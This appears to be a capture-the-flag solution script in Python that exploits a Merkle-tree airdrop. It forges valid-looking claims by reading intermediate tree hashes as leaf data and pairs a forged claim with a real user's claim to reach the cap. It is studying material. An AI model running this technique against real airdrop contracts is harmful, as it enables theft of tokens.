import json
from web3 import Web3

tree = json.load(open("data/tree.json", "r"))

print("STEP 1 - Find all the unwanted valid data")

unwanted_valid_data = []

max_path_length = 6
hashes_by_height = [[] for _ in range(max_path_length+1)]
hashes_by_height[max_path_length] = tree["merkleRoot"]

for height in range(max_path_length-1, -1, -1):
    for address in tree["claims"]:
        claim = tree["claims"][address]
        if claim["proof"][height] not in hashes_by_height[height]:
            hashes_by_height[height].append(claim["proof"][height])

for height in range(max_path_length):
    for h1 in hashes_by_height[height]:
        for h2 in hashes_by_height[height]:
             keccak = Web3.soliditySha3(['bytes32', 'bytes32'], [h1, h2]).hex()
             if keccak in hashes_by_height[height+1]:
                unwanted_valid_data.append(h1 + h2[2:])

print("%d unwanted valid data found." % len(unwanted_valid_data))

print("STEP 2 - Find a data with a decent claim amount")

max_claim_amount = 75 * 10 ** 21
claimable_unwanted_data = []

for data in unwanted_valid_data:
    amount = int(data[2+(32+20)*2:], 16)
    if amount <= max_claim_amount:
        claimable_unwanted_data.append((data, amount))

print("%d unwanted claimable data found." % len(claimable_unwanted_data))

print("STEP 3 - Find an user that can claim the remaining amount")

remaining_amount = max_claim_amount - claimable_unwanted_data[0][1]

for address in tree["claims"]:
    if (int(tree["claims"][address]["amount"], 16) == remaining_amount):
        user_claim = tree["claims"][address]
        user_claim["account"] = address
        user_claim["amount"] = int(user_claim["amount"], 16)
        print("An user can claim the remaining amount.")
        break

print("STEP 4 - Build the solution")

def get_proof(data):
    hash = Web3.soliditySha3(['bytes32'], [data]).hex()
    proof = []
    for height in range(max_path_length):
        for h2 in hashes_by_height[height]:
            keccak = Web3.soliditySha3(['bytes32', 'bytes32'], [hash, h2]).hex()
            if keccak in hashes_by_height[height+1]:
                proof.append(h2)
                hash = keccak
                break
            keccak = Web3.soliditySha3(['bytes32', 'bytes32'], [h2, hash]).hex()
            if keccak in hashes_by_height[height+1]:
                proof.append(h2)
                hash = keccak
                break
    return proof

unwanted_claim = {
    "index": int(claimable_unwanted_data[0][0][2:2+32*2], 16),
    "account": Web3.toChecksumAddress(claimable_unwanted_data[0][0][2+32*2:2+(32+20)*2]),
    "amount": claimable_unwanted_data[0][1],
    "proof": get_proof(claimable_unwanted_data[0][0])
}

print("Unwanted claim: " + str(json.dumps(unwanted_claim, indent=4, sort_keys=True)))
print("User claim: " + str(json.dumps(user_claim, indent=4, sort_keys=True)))